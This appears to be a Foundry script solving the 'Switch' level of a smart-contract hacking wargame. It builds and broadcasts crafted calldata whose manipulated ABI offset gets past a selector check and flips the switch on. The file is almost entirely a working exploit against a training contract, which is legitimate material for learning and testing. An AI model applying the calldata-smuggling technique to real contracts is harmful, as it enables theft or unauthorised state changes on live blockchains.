// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/29-Switch.sol";  // 请确保路径正确

contract Attack {
    Switch SwitchInstance;

    constructor(address _SwitchInstance) {
        SwitchInstance = Switch(_SwitchInstance);
    }

    // 攻击函数
    function attack() public {
        // 30c13ade    selector
        // 0000000000000000000000000000000000000000000000000000000000000060 // offset of bytes 0x60
        // 0000000000000000000000000000000000000000000000000000000000000000 // dummy data  0x00
        // 20606e1500000000000000000000000000000000000000000000000000000000 // turnSwitchOff.selector
        // 0000000000000000000000000000000000000000000000000000000000000004 // length of bytes
        // 76227e1200000000000000000000000000000000000000000000000000000000 // turnSwitchOn.selector
        bytes memory payload = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        (bool success,) = address(SwitchInstance).call(payload);
        require(success, "failed");
    }
}

contract Exp is Script {
    Switch public SwitchInstance = Switch(payable(0xEE127a14E7eF6A1E615988C81CADEcf084488b94)); // 请替换为实际的目标地址
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(hacker);

        Attack attack = new Attack(address(SwitchInstance));
        attack.attack();

        vm.stopBroadcast();
    }
}


